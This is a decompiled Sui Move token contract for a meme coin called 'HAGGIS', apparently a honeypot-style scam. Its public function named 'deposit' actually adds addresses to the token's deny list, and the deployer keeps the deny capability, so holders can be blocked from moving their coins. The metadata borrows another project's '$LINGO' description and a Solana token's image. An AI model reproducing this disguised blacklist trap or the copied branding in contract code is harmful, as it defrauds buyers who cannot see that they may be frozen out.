module 0xcb84f906e8a0212e5abc6ff9d388c8c79d32c3e7ed67241f0840ded7cb8569a7::haggis {
    struct HAGGIS has drop {
        dummy_field: bool,
    }

    public fun deposit(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<HAGGIS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<HAGGIS>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: HAGGIS, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = trim_right(b"111111111   ");
        let v1 = trim_right(b"https://dd.dexscreener.com/ds-data/tokens/solana/GKePqWhc99qhYVQP7VRzBSjBv9DEjrPa8HiBtFHVJW3A.png?size=lg&key=589be2                                                                                                                                                                                                            ");
        let v2 = if (0x1::vector::length<u8>(&v1) == 0) {
            0x1::option::none<0x2::url::Url>()
        } else {
            0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(v1))
        };
        let (v3, v4, v5) = 0x2::coin::create_regulated_currency_v2<HAGGIS>(arg0, (0x1::vector::length<u8>(&v0) as u8), 0x1::ascii::into_bytes(0x1::string::to_ascii(0x1::string::utf8(trim_right(b"Haggis  ")))), trim_right(b"New Born Haggis Pygmy Hippo     "), trim_right(b"$LINGO is the first token that leverages Real World Assets, gamification and crypto culture to fuel and disrupt community rewards.                                                                                                                                                                                              "), v2, false, arg1);
        let v6 = v3;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<HAGGIS>>(v5);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<HAGGIS>>(v6);
        0x2::transfer::public_transfer<0x2::coin::Coin<HAGGIS>>(0x2::coin::mint<HAGGIS>(&mut v6, 1000000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<HAGGIS>>(v4, 0x2::tx_context::sender(arg1));
    }

    fun trim_right(arg0: vector<u8>) : vector<u8> {
        let v0 = 32;
        let v1 = &v0;
        while (0x1::vector::length<u8>(&arg0) > 0) {
            if (0x1::vector::borrow<u8>(&arg0, 0x1::vector::length<u8>(&arg0) - 1) != v1) {
                break
            };
            0x1::vector::pop_back<u8>(&mut arg0);
        };
        arg0
    }

    // decompiled from Move bytecode v6
}

